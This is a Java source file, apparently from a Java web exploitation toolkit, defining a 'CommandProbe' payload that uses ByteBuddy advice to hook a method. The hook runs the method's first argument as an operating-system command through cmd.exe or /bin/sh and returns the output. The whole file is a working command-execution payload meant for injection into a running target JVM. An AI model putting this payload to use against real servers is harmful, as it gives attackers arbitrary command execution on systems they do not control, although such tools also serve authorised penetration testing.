package com.reajason.javaweb.probe.payload;

import com.reajason.javaweb.probe.generator.response.ResponseBodyGenerator;
import lombok.SneakyThrows;
import net.bytebuddy.asm.Advice;

import java.util.Scanner;

/**
 * @author ReaJason
 * @since 2025/8/5
 */
public class CommandProbe {
    private final String command;

    public CommandProbe(String command) {
        this.command = command;
    }

    @Advice.OnMethodExit
    public static String exit(@Advice.Argument(0) String data,
                              @Advice.Return(readOnly = false) String ret,
                              @ResponseBodyGenerator.ValueAnnotation String template
    ) throws Exception {
        String[] cmdarray = null;
        String t = template;
        if (t == null) {
            cmdarray = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe", "/c", data} : new String[]{"/bin/sh", "-c", data};
        } else {
            if (t.contains("\"{command}\"")) {
                String[] split = t.split("\\s+");
                for (int i = 0; i < split.length; i++) {
                    split[i] = split[i].replace("\"{command}\"", data);
                }
                cmdarray = split;
            } else {
                String cmdline = t.replace("{command}", data);
                cmdarray = cmdline.split("\\s+");
            }
        }
        Process process = new ProcessBuilder(cmdarray).redirectErrorStream(true).start();
        return ret = new Scanner(process.getInputStream()).useDelimiter("\\A").next();
    }

    @Override
    @SneakyThrows
    public String toString() {
        return CommandProbe.exit(command, super.toString(), null);
    }
}
